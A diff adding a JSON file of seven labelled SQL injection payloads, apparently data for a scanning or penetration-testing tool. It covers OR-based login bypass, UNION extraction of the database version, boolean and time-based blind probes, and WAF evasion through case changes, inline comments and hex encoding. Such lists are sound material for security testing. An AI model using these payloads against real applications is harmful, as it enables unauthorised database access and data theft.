@@ -1,0 +1,37 @@
+[
+  {
+    "type": "Error-Based SQLi",
+    "payload": "' OR 1=1--",
+    "bypass": "Classic OR-based bypass"
+  },
+  {
+    "type": "UNION-Based SQLi",
+    "payload": "' UNION SELECT NULL, version()--",
+    "bypass": "Use UNION to extract DB info"
+  },
+  {
+    "type": "Blind SQLi (Boolean)",
+    "payload": "' AND 1=1--",
+    "bypass": "True condition"
+  },
+  {
+    "type": "Blind SQLi (Time-based)",
+    "payload": "'; IF(1=1) WAITFOR DELAY '0:0:5'--",
+    "bypass": "Time delay-based detection"
+  },
+  {
+    "type": "WAF Bypass - Case Variation",
+    "payload": "' oR 1=1--",
+    "bypass": "Bypass filters with casing"
+  },
+  {
+    "type": "WAF Bypass - Inline Comments",
+    "payload": "'/**/OR/**/1=1--",
+    "bypass": "Split keywords with inline comments"
+  },
+  {
+    "type": "Hex Encoded",
+    "payload": "0x6861636b6564",
+    "bypass": "Use hex to bypass filters"
+  }
+]
